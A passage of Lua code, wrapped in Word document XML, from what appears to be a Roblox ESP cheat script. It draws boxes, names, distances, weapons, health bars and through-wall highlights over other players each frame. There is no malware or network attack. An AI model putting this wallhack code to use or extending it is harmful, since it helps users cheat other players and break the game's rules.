        <w:t xml:space="preserve">                            Weapon.Font = Config.ESP.Font</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        do -- \\ Boxes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Box.Visible = Config.ESP.Drawing.Boxes.Full.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Config.ESP.Drawing.Boxes.Filled.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Box.BackgroundColor3 = Color3.fromRGB(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Config.ESP.Drawing.Boxes.GradientFill then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Box.BackgroundTransparency = Config.ESP.Drawing.Boxes.Filled.Transparency;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Box.BackgroundTransparency = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Box.BorderSizePixel = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Box.BackgroundTransparency = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not Config.ESP.Drawing.Boxes.Bounding.Enabled or (Config.ESP.Drawing.Boxes.Corner.Enabled and Config.ESP.Drawing.Boxes.Bounding.Enabled) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LeftTop.Transparency = Config.ESP.Drawing.Boxes.Corner.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LeftTop.BackgroundColor3 = Config.ESP.Drawing.Boxes.Corner.RGB</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LeftSide.Transparency = Config.ESP.Drawing.Boxes.Corner.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LeftSide.BackgroundColor3 = Config.ESP.Drawing.Boxes.Corner.RGB</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                BottomSide.Transparency = Config.ESP.Drawing.Boxes.Corner.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                BottomSide.BackgroundColor3 = Config.ESP.Drawing.Boxes.Corner.RGB</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                BottomDown.Transparency = Config.ESP.Drawing.Boxes.Corner.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                BottomDown.BackgroundColor3 = Config.ESP.Drawing.Boxes.Corner.RGB</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                RightTop.Transparency = Config.ESP.Drawing.Boxes.Corner.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                RightTop.BackgroundColor3 = Config.ESP.Drawing.Boxes.Corner.RGB</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                RightSide.Transparency = Config.ESP.Drawing.Boxes.Corner.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                RightSide.BackgroundColor3 = Config.ESP.Drawing.Boxes.Corner.RGB</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                BottomRightSide.Transparency = Config.ESP.Drawing.Boxes.Corner.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                BottomRightSide.BackgroundColor3 = Config.ESP.Drawing.Boxes.Corner.RGB</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                BottomRightDown.Transparency = Config.ESP.Drawing.Boxes.Corner.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                BottomRightDown.BackgroundColor3 = Config.ESP.Drawing.Boxes.Corner.RGB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not Config.ESP.Drawing.Boxes.Corner.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LeftTop.Transparency = Config.ESP.Drawing.Boxes.Bounding.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LeftSide.Transparency = Config.ESP.Drawing.Boxes.Bounding.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                BottomSide.Transparency = Config.ESP.Drawing.Boxes.Bounding.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                RightSide.Transparency = Config.ESP.Drawing.Boxes.Bounding.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LeftTop.BackgroundColor3 = Config.ESP.Drawing.Boxes.Bounding.RGB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LeftSide.BackgroundColor3 = Config.ESP.Drawing.Boxes.Bounding.RGB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                BottomSide.BackgroundColor3 = Config.ESP.Drawing.Boxes.Bounding.RGB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                RightSide.BackgroundColor3 = Config.ESP.Drawing.Boxes.Bounding.RGB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BottomSide.AnchorPoint = Vector2.new(0, 5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BottomDown.AnchorPoint = Vector2.new(0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            RightTop.AnchorPoint = Vector2.new(1, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            RightSide.AnchorPoint = Vector2.new(0, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BottomRightSide.AnchorPoint = Vector2.new(1, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BottomRightDown.AnchorPoint = Vector2.new(1, 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not Config.ESP.Drawing.Boxes.Animate then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Gradient1.Rotation = -45</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Gradient2.Rotation = -45</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Gradient1.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Config.ESP.Drawing.Boxes.GradientFillRGB1), ColorSequenceKeypoint.new(1, Config.ESP.Drawing.Boxes.GradientFillRGB2)}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Gradient2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Config.ESP.Drawing.Boxes.GradientRGB1), ColorSequenceKeypoint.new(1, Config.ESP.Drawing.Boxes.GradientRGB2)}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        do -- \\ Names</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name.TextSize = Config.ESP.FontSize</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            --Name.Font = Config.ESP.Font</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name.TextColor3 = Config.ESP.Drawing.Names.RGB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name.TextStrokeTransparency = Config.ESP.Drawing.Names.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        do -- \\ Chams</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Config.ESP.Drawing.Chams.VisibleCheck then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Chams.DepthMode = "Occluded"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Chams.DepthMode = "AlwaysOnTop"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Chams.FillColor = Config.ESP.Drawing.Chams.FillRGB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Chams.OutlineColor = Config.ESP.Drawing.Chams.OutlineRGB</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not Config.ESP.Drawing.Chams.Thermal then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Chams.OutlineTransparency = Config.ESP.Drawing.Chams.Outline_Transparency / 100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Chams.FillTransparency = Config.ESP.Drawing.Chams.Fill_Transparency / 100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do -- \\ Rest im lazy cuzzy bro</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Distance.TextStrokeTransparency = Config.ESP.Drawing.Distances.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Distance.TextSize = Config.ESP.FontSize</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Distance.TextColor3 = Config.ESP.Drawing.Distances.RGB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Weapon.TextStrokeTransparency = Config.ESP.Drawing.Weapons.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Weapon.TextSize = Config.ESP.FontSize</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Weapon.TextColor3 = Config.ESP.Drawing.Weapons.WeaponTextRGB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players_ESP[plr.Name].Health_Changed = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    health_clamped = math.clamp(Humanoid.Health, 0, Humanoid.MaxHealth)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    health = health_clamped / Humanoid.MaxHealth;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players_ESP[plr.Name].Health_Changed()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players_ESP[plr.Name].Child_Added = LPH_NO_VIRTUALIZE(function(Item)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Item:IsA("Tool") then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local name = plr.Character:FindFirstChild(Item.Name) and Item.Name or "None"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Weapon.Text = name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players_ESP[plr.Name].ToolConnection_Added = plr.Character.ChildAdded:Connect(Players_ESP[plr.Name].Child_Added)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players_ESP[plr.Name].ToolConnection_Removed = plr.Character.ChildRemoved:Connect(Players_ESP[plr.Name].Child_Added)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players_ESP[plr.Name].HumanoidConnection = Humanoid.HealthChanged:Connect(Players_ESP[plr.Name].Health_Changed)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players_ESP[plr.Name].CharacterAdded = plr.CharacterAdded:Connect(LPH_JIT_MAX(function(Character)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Humanoid = Character:WaitForChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    HRP = Character:WaitForChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[plr.Name].ToolConnection_Added:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[plr.Name].ToolConnection_Removed:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[plr.Name].ToolConnection_Removed = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[plr.Name].ToolConnection_Added = nil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[plr.Name].ToolConnection_Added = plr.Character.ChildAdded:Connect(Players_ESP[plr.Name].Child_Added)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[plr.Name].ToolConnection_Removed = plr.Character.ChildRemoved:Connect(Players_ESP[plr.Name].Child_Added)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[plr.Name].HumanoidConnection:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[plr.Name].HumanoidConnection = Humanoid.HealthChanged:Connect(Players_ESP[plr.Name].Health_Changed)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[plr.Name].Health_Changed()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[plr.Name].RefreshElements()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players_ESP[plr.Name].RefreshElements()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Updater = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Connection;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local HideESP = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Box.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Distance.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Weapon.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Healthbar.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BehindHealthbar.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    HealthText.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    WeaponIcon.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LeftTop.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LeftSide.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BottomSide.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BottomDown.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RightTop.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RightSide.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BottomRightSide.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BottomRightDown.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Flag1.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Chams.Enabled = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Flag2.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not plr then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ScreenGui:Destroy();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Connection:Disconnect();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    --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Connection = Euphoria.RunService.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if plr.Character and lplayer.Character and Config.ESP.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Humanoid and HRP then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Pos, OnScreen = Cam:WorldToScreenPoint(HRP.Position)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Dist = (Cam.CFrame.Position - HRP.Position).Magnitude</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if OnScreen and Dist &lt;= Config.ESP.MaxDistance then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Size = HRP.Size.Y</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if DefaultPlayerSettings[plr.Name] and DefaultPlayerSettings[plr.Name].RootSettings and DefaultPlayerSettings[plr.Name].RootSettings.Size then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Size = DefaultPlayerSettings[plr.Name].RootSettings.Size.Y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                scaleFactor = (Size * Cam.ViewportSize.Y) / (Pos.Z * 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                w, h = 3 * scaleFactor, 4.5 * scaleFactor</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                -- Fade-out effect --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Config.ESP.FadeOut.OnDistance then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(Box, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(Outline, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(Name, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(Distance, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(Weapon, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(Healthbar, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(BehindHealthbar, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(HealthText, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(WeaponIcon, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(LeftTop, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(LeftSide, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(BottomSide, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(BottomDown, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(RightTop, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(RightSide, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(BottomRightSide, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(BottomRightDown, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(Chams, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(Flag1, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Functions.FadeOutOnDist(Flag2, Dist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                -- Teamcheck</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if HRP and Humanoid then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    do -- Chams</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        Chams.Adornee = plr.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        Chams.Enabled = Config.ESP.Drawing.Chams.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        do -- Breathe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            if Config.ESP.Drawing.Chams.Thermal then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                local breathe_effect = math.atan(math.sin(tick() * 2)) * 2 / math.pi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                Chams.FillTransparency = Config.ESP.Drawing.Chams.Fill_Transparency * breathe_effect * 0.01</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                Chams.OutlineTransparency = Config.ESP.Drawing.Chams.Outline_Transparency * breathe_effect * 0.01</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    do -- Corner Boxes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        if not Config.ESP.Drawing.Boxes.Bounding.Enabled or (Config.ESP.Drawing.Boxes.Corner.Enabled and Config.ESP.Drawing.Boxes.Bounding.Enabled) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LeftTop.Visible = Config.ESP.Drawing.Boxes.Corner.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LeftTop.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y - h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LeftTop.Size = UDim2.new(0, w / 5, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LeftSide.Visible = Config.ESP.Drawing.Boxes.Corner.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LeftSide.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y - h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
